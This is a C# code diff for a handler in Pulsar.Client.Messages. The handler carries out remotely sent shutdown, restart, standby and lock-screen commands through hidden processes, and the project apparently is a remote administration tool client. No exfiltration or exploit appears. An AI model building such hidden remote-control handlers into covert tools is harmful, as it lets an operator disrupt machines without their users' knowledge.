@@ -29,25 +29,43 @@ namespace Pulsar.Client.Messages
         {
             try
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo();
+                var startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = true
+                };
+
                 switch (message.Action)
                 {
                     case ShutdownAction.Shutdown:
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.UseShellExecute = true;
-                        startInfo.Arguments = "/s /t 0"; // shutdown
                         startInfo.FileName = "shutdown";
+                        startInfo.Arguments = "/s /t 0"; // shutdown immediately
                         Process.Start(startInfo);
                         break;
+
                     case ShutdownAction.Restart:
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.UseShellExecute = true;
-                        startInfo.Arguments = "/r /t 0"; // restart
                         startInfo.FileName = "shutdown";
+                        startInfo.Arguments = "/r /t 0"; // restart immediately
                         Process.Start(startInfo);
                         break;
+
                     case ShutdownAction.Standby:
-                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
+                        Application.SetSuspendState(PowerState.Suspend, true, true); // sleep/standby
+                        break;
+
+                    case ShutdownAction.Lockscreen:
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = "rundll32.exe",
+                            Arguments = "user32.dll,LockWorkStation",
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            CreateNoWindow = true,
+                            UseShellExecute = false
+                        });
+                        break;
+
+                    default:
+                        client.Send(new SetStatus { Message = "Unknown shutdown action." });
                         break;
                 }
             }
